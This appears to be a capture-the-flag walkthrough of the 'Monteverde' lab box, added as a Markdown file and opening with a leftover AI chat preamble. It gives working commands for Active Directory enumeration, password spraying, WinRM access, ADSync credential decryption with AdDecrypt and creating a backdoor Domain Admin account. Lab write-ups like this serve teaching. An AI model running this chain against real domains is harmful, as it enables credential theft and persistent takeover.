@@ -1,0 +1,262 @@
+Absolutely! Here's a polished, **GitHub-ready Markdown walkthrough** of your Monteverde engagement, fully in English, keeping all your commands, IPs, and adding detailed explanations, reasoning, and extra possible scenarios at the end. I’ve also clarified each step and rationale to make it educational for readers.
+
+---
+
+# Monteverde Walkthrough: Active Directory and Azure AD Connect Exploitation
+
+This walkthrough covers a full penetration test on the `MONTEVERDE` host, detailing enumeration, credential harvesting, privilege escalation, and persistence, with reasoning and alternative scenarios.
+
+---
+
+## 1. Enumeration
+
+We start by identifying the open ports and services on the target host using `nmap`.
+
+```bash
+$ nmap -sV -sC -Pn -v 10.129.10.65
+```
+
+**Scan results:**
+
+| Port    | State | Service      | Version                                                                                         |
+| ------- | ----- | ------------ | ----------------------------------------------------------------------------------------------- |
+| 53/tcp  | open  | domain       | Simple DNS Plus                                                                                 |
+| 135/tcp | open  | msrpc        | Microsoft Windows RPC                                                                           |
+| 139/tcp | open  | netbios-ssn  | Microsoft Windows netbios-ssn                                                                   |
+| 389/tcp | open  | ldap         | Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name) |
+| 445/tcp | open  | microsoft-ds | ?                                                                                               |
+| 464/tcp | open  | kpasswd5     | ?                                                                                               |
+| 593/tcp | open  | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                             |
+| 636/tcp | open  | tcpwrapped   |                                                                                                 |
+
+**Service Info:** `Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows`
+
+**Reasoning:**
+
+* Ports 135, 139, 445, and 389 indicate a Windows host likely running Active Directory.
+* LDAP (389) allows enumeration of users and groups.
+* SMB (445) can provide further access, including shares.
+* RPC (135) provides `rpcclient` enumeration capabilities.
+
+---
+
+### 1.1 RPC Enumeration (Port 135)
+
+```bash
+rpcclient $> enumdomusers
+```
+
+**Important users identified:**
+
+```
+Guest, AAD_987d7f2f57d2, mhope, SABatchJobs, svc-ata, svc-bexec, svc-netapp, dgalanos, roleary, smorgan
+```
+
+**Observation:**
+
+* `AAD_987d7f2f57d2` → Azure AD Connect account
+
+  * Responsible for AD synchronization
+  * Stores password sync artifacts
+  * Credentials can be exposed in AD attributes
+  * Often high privileges
+
+```bash
+rpcclient $> enumdomgroups
+```
+
+**Important groups:**
+
+```
+Domain Users, Azure Admins, File Server Admins, Domain Admins (if any), HelpDesk, Developers, etc.
+```
+
+```bash
+rpcclient $> getdompwinfo
+```
+
+**Password policy:**
+
+```
+min_password_length: 7
+password_properties: 0x00000000
+```
+
+**Reasoning:** Weak policies may allow password spraying.
+
+---
+
+### 1.2 SMB Enumeration (Port 445)
+
+```bash
+$ crackmapexec smb 10.129.10.65 -u "" -p "" --shares
+```
+
+* Access denied on shares without valid credentials
+* Confirms SMBv1 disabled, signing enabled
+
+---
+
+### 1.3 Kerberos Enumeration (Port 88)
+
+```bash
+$ impacket-GetNPUsers MEGABANK.local/ -dc-ip 10.129.10.65 -usersfile users.txt -format hashcat
+```
+
+* No preauth-exempt accounts
+* Cannot perform AS-REP roasting
+* Dead end for Kerberos attacks
+
+---
+
+### 1.4 LDAP Enumeration (Port 389)
+
+```bash
+ldapsearch -x -H ldap://10.129.10.65 -b "DC=megabank,DC=local" \
+"(|(objectClass=user)(objectClass=group))" \
+sAMAccountName cn description comment info memberOf userPassword pwdLastSet \
+> ldap_important.txt
+```
+
+* Extracted critical Azure AD Connect service account:
+
+  ```
+  dn: CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
+  description: Service account for the Synchronization Service
+  memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+  sAMAccountName: AAD_987d7f2f57d2
+  ```
+
+**Observations:**
+
+* Often weak or unchanged passwords
+* Member of Azure Admins → high privilege risk
+
+---
+
+## 2. Credential Discovery
+
+We discovered valid credentials via manual SMB enumeration:
+
+```bash
+$ smbclient //10.129.228.111/user$ -U 'SABatchJobs%SABatchJobs'
+```
+
+* Retrieved file: `\mhope\azure.xml` containing password: `4n0therD4y@n0th3r$`
+
+**Password spraying test:**
+
+```bash
+$ crackmapexec smb 10.129.228.111 -u users.txt -p "4n0therD4y@n0th3r$" --continue-on-success
+```
+
+* Only successful login: `MEGABANK.LOCAL\mhope`
+
+---
+
+## 3. Initial Access
+
+```bash
+$ crackmapexec winrm 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
+$ evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
+```
+
+**User Information:**
+
+* `mhope` is a member of:
+
+  * `Azure Admins`
+  * `Remote Management Users`
+* Elevated privileges confirmed via `whoami /all`
+
+---
+
+## 4. Azure AD Connect Analysis
+
+**Objective:** Harvest AD sync account credentials stored locally
+
+```powershell
+Get-Service ADSync
+Import-Module ADSync
+```
+
+* ADSync running
+* Data stored in: `C:\Program Files\Microsoft Azure AD Sync\Data\mv.dsml`
+
+**Privilege Escalation Tool:** [AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)
+
+```powershell
+cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
+C:\Users\mhope\appdata\local\temp\Low\chrome_install\AdDecrypt.exe -FullSQL
+```
+
+* Retrieved Administrator password: `d0m@in4dminyeah!`
+* Verified access with:
+
+```bash
+evil-winrm -i 10.129.228.111 -u administrator -p 'd0m@in4dminyeah!'
+```
+
+**Reasoning:**
+
+* ADSync stores AD Connect credentials in reversible format
+* Exploitable with local admin privileges
+
+---
+
+## 5. Persistence
+
+Created a new user with Domain Admin rights:
+
+```powershell
+New-ADUser -Name "svc_backup" -SamAccountName svc_backup -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Enabled $true
+Add-ADGroupMember -Identity "Domain Admins" -Members "svc_backup"
+```
+
+**Tested persistence:**
+
+```bash
+evil-winrm -i 10.129.228.111 -u svc_backup -p 'P@ssw0rd123!'
+whoami /all
+```
+
+* Confirmed membership in `Domain Admins`
+* Account ready for long-term access
+
+---
+
+## 6. Alternative Scenarios & Notes
+
+1. **Kerberos Preauth Exploits**
+
+   * If `UF_DONT_REQUIRE_PREAUTH` was set for an account, AS-REP roasting could harvest credentials without triggering alerts.
+
+2. **Password Spray**
+
+   * Weak password policies (`min_length:7`) could be abused with a list of common passwords for multiple accounts.
+
+3. **Azure AD Connect**
+
+   * Could also exploit misconfigured sync accounts for lateral movement without local admin, depending on rights in `ADSync` SQL database.
+
+4. **SMB Share Enumeration**
+
+   * `ADMIN$`, `C$`, `E$` could allow credential dumping if valid credentials discovered on other hosts.
+
+5. **Remote Management Users**
+
+   * Other remote services like RDP or WinRM could be targeted if additional service accounts exist.
+
+6. **AD Attributes**
+
+   * Sensitive info in `info`, `description`, or `comment` fields may leak internal architecture or passwords.
+
+---
+
+**Conclusion:**
+
+* This walkthrough demonstrates a full chain from enumeration to privilege escalation and persistence on a Windows AD environment with Azure AD Connect.
+* Manual SMB enumeration, local credentials extraction, and ADSync database decryption were critical for gaining domain admin access.
+* Multiple alternative attack paths exist depending on account policies, password complexity, and service configurations.
+
+---
